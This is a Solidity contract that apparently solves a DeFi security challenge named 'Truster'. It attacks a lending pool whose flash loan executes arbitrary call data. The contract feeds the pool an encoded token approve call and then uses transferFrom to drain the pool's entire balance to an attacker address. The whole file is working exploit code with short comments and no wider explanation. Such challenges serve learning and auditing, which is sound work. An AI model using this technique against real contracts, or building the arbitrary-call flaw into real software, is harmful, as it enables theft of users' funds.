// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";

contract TrusterLenderAttacker {
    function attack(
        IERC20 token,
        TrusterLenderPool pool,
        address attackerEOA
    ) public {

        uint256 poolBalance = token.balanceOf(address(pool));
        // IERC20::approve(address spender, uint256 amount)
        // flashloan executes "target.call(data);", approve our contract to withdraw all liquidity
        bytes memory approvePayload = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            poolBalance
        );
        pool.flashLoan(0, attackerEOA, address(token), approvePayload);

        // once approved, use transferFrom to withdraw all pool liquidity
        token.transferFrom(address(pool), attackerEOA, poolBalance);
    }
}